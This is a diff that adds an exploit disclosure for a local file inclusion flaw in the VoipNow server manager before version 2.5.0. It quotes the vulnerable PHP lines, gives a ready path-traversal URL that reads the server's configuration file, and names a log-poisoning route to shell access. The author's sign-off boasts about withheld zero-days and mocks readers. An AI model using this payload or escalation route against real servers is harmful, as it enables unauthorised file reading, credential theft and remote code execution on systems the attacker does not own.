@@ -1,0 +1,32 @@
+/*
++ Application : Voipnow
+| Version , Perior to 2.5.0
+| Download : http://4psa.com/
+| By Faris , AKA i-Hmx
+| n0p1337@gmail.com
++ sec4ever.com , 1337s.cc
+*/
+
+VoipNow is commercial web GUI voip server manager,
+it's affected by local file inclusion vuln
+File : /usr/local/voipnow/admin/htdocs/help/index.php
+
+Line 832
+if ( !( isset( $_GET['screen'] ) && trim( $_GET['screen'] ) != "" ) )
+{
+    exit( );
+}
+
+Line 872
+require( $help_path.trim( $_GET['screen'] ) );
+
+Example : https://target/help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf
+
+can be exploited to gain shell access to the server via infecting Logs which located at
+ /usr/local/voipnow/admin/logs/access.log
+ 
+NP : Sorry Guys for the time you wasted tracing my Elastix Logs ;)
+     But The 0day Remain 0day till i decide to dislose it by my own xD
+	 and again Enjoy the song : http://www.youtube.com/watch?v=d-ELnDPmI8w
+	 keep in Your skiddy minds , "I Ain't Mad At Cha"
+	 < Faris , The Awsome xD >
